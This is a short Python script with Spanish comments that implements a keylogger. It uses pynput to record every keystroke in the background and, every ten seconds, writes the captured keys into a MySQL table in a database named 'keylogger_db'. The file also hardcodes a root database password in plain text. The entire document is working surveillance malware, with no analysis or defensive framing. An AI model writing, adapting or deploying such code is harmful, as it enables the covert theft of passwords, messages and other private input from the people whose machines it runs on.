import mysql.connector
import threading
import time
from pynput import keyboard

# Configuración de la conexión a la base de datos MySQL
db_config = {
    'user': 'root',            # Reemplaza con tu usuario de MySQL
    'password': 'proalafalda',      # Reemplaza con tu contraseña de MySQL
    'host': '127.0.0.1',              # O la IP de tu servidor MySQL
    'database': 'keylogger_db'        # El nombre de la base de datos que creaste
}

# Conexión a la base de datos
conn = mysql.connector.connect(**db_config)
cursor = conn.cursor()

# Lista para almacenar las teclas pulsadas
keystrokes = []

def on_press(key):
    try:
        keystrokes.append(str(key.char))
    except AttributeError:
        keystrokes.append(str(key))

def store_keystrokes():
    while True:
        time.sleep(10)  # Espera 9 minutos - 540
        if keystrokes:
            sql = "INSERT INTO keystrokes (`key`) VALUES (%s)"
            cursor.executemany(sql, [(k,) for k in keystrokes])
            conn.commit()
            keystrokes.clear()  # Limpiar la lista después de almacenarla

# Iniciar el hilo de almacenamiento en segundo plano
store_thread = threading.Thread(target=store_keystrokes)
store_thread.daemon = True
store_thread.start()

# Escuchar las teclas en segundo plano
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# Cerrar la conexión a la base de datos al terminar
conn.close()
